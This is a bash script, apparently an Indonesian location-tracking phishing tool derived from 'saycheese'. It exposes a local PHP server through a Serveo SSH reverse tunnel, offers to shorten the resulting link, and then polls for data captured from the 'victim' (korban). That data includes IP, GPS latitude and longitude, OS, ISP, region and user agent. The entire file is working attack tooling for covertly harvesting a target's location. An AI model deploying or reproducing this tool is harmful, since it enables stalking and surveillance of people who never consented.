#!/bin/bash
# Referen by saycheese

checkphp=$(ps aux | grep -o "php" | head -n1)

function trap_ctrlc ()
{
    printf "\n\n[\e[31m-\e[0m] Exiting...."
    cekSShRunning=$(ps aux | grep "ssh")
    cekPhpRunning=$(ps aux | grep "php")
    if [[ $cekSShRunning ]]; then
        printf "\n[\e[0m\e[1;93m!\e[0m] Killing ssh..."
        sleep 2
        pkill ssh
        printf "\n[\e[1;92m+\e[0m] Killed ssh!"
    elif [[ $cekPhpRunning ]]; then
        printf '\n[-] Killing php...'
        sleep 2
        pkill php
        printf "\n[\e[1;92m+\e[0m] Killed php!"
    fi

    printf "\n[\e[1;92m+\e[0m] Done\n"

    exit
}

banner() {
    printf "      \e[1;92m _______                _    \e[0m ______  \n"            
    printf "      \e[1;92m(_______)              | |   \e[0m(______)\n   "          
    printf "      \e[1;92m _  ____ _____  ____| |  _ _ \e[0m    _ _____ _   _\n" 
    printf "      \e[1;92m   | |/ ___|____ |/ ___) |_/ )\e[0m |   | | ___ | | | |\n"
    printf "      \e[1;92m   | | |   / ___ ( (___|  _ (|\e[0m |__/ /| ____|\ V /\n"
    printf "      \e[1;92m   |_|_|   \_____|\____)_| \_)\e[0m_____/ |_____) \_/\n"
    printf "      Reference: https://github.com/thelinuxchoice/saycheese\n"
    printf "             Coded By Muhammad Fauzan from { IndoSec }\n\n"
}


start_server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH tidak terinstall"; exit 1; }

    printf "[\e[0m\e[1;93m!\e[0m] Starting Serveo .... ($subdomain.serveo.net)\n"
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
    sleep 1.5
    printf "[\e[1;92m+\e[0m] Serveo started...\n"
    sleep 1.5
    printf "[\e[0m\e[1;93m!\e[0m] Starting PHP server .... (localhost:3333)\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 1.5
    printf "[\e[1;92m+\e[0m] PHP started...\n"
    sleep 3
    printf "[\e[0m\e[1;93m!\e[0m] Membuat link...\n"
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf "[\e[0m\e[1;93m?\e[0m] Gunakan pemendek url? [y/n]: "
    read usepemendekurl
    # sleep 1.5
    if [[ $usepemendekurl == "y" ]];then
        printf "[\e[0m\e[1;93m!\e[0m] Memendekkan link...\n"
        link2=$(php shortlink.php ${link})
        printf "[\e[1;92m+\e[0m] Berhasil memendekkan Link : ${link2}"
    elif [[ $usepemendekurl == "n" ]]; then
        printf "[\e[1;92m+\e[0m] Berhasil membuat link : ${link}\n"
    fi
    sleep 1
    while [ true ]; do
    if [[ -e "data.json" ]]; then
        printf "\n\n[\e[1;92m+\e[0m] \e[1;92mTarget opened link"
        sleep 1
        pesan=$(grep -Po '"geolocation":.*?\K[^\\]{6}' data.json | grep 'true')
        accepted_geolocation=$(grep -Po '"accepted_geolocation":.*?\K[^\\]{6}' data.json | grep 'true')
        ip=$(cat data.json | grep -Po '(?<="ip": ").*?(?=")')
        latitude=$(cat data.json | grep -Po '(?<="latitude": ").*?(?=")')
        longitude=$(cat data.json | grep -Po '(?<="longitude": ").*?(?=")')
        platform=$(cat data.json | grep -Po '(?<="platform": ").*?(?=")')
        provider=$(cat data.json | grep -Po '(?<="provider": ").*?(?=")')
        country_name=$(cat data.json | grep -Po '(?<="country_name": ").*?(?=")')
        region=$(cat data.json | grep -Po '(?<="region": ").*?(?=")')
        useragent=$(cat data.json | grep -Po '(?<="useragent": ").*?(?=")')
        if [[ $pesan ]]; then
            printf '\n[\e[1;92m+\e[0m] \e[1;92mBrowser korban mendukung akses lokasi!'
            sleep 1
            if [[ $accepted_geolocation ]]; then
                printf '\n[\e[1;92m+\e[0m] \e[1;92mKorban mengizinkan akses lokasi!'
                printf "\n[\e[1;92m+\e[0m] IP                : $ip"
                printf "\n[\e[1;92m+\e[0m] Latitude          : $latitude"
                printf "\n[\e[1;92m+\e[0m] Longitude         : $longitude"
                printf "\n[\e[1;92m+\e[0m] Operating System  : $platform"
                printf "\n[\e[1;92m+\e[0m] Provider          : $provider"
                printf "\n[\e[1;92m+\e[0m] Nama Negara       : $country_name"
                printf "\n[\e[1;92m+\e[0m] Wilayah           : $region"
                printf "\n[\e[1;92m+\e[0m] User Agent        : $useragent"
            else
                printf '\n[\e[1;91m-\e[0m] \e[1;91mKorban tidak mengizinkan akses lokasi!'
                printf "\n[\e[1;92m+\e[0m] IP                : $ip"
                printf "\n[\e[1;92m+\e[0m] Operating System  : $platform"
                printf "\n[\e[1;92m+\e[0m] Provider          : $provider"
                printf "\n[\e[1;92m+\e[0m] Nama Negara       : $country_name"
                printf "\n[\e[1;92m+\e[0m] Wilayah           : $region"
                printf "\n[\e[1;92m+\e[0m] User Agent        : $useragent"
            fi
        elif [[ !$pesan ]]; then
            echo '\n[\e[1;91m-\e[0m] \e[1;91mBrowser korban tidak mendukung akses lokasi'
            printf "\n[\e[1;92m+\e[0m] IP                : $ip"
            printf "\n[\e[1;92m+\e[0m] Operating System  : $platform"
            printf "\n[\e[1;92m+\e[0m] Provider          : $provider"
            printf "\n[\e[1;92m+\e[0m] Nama Negara       : $country_name"
            printf "\n[\e[1;92m+\e[0m] Wilayah           : $region"
            printf "\n[\e[1;92m+\e[0m] User Agent        : $useragent"
        fi
        rm -rf data.json
    fi

    done
}


trap "trap_ctrlc" 2

banner
printf "[\e[0m\e[1;93m?\e[0m] Subdomain : "
read subdomain
start_server
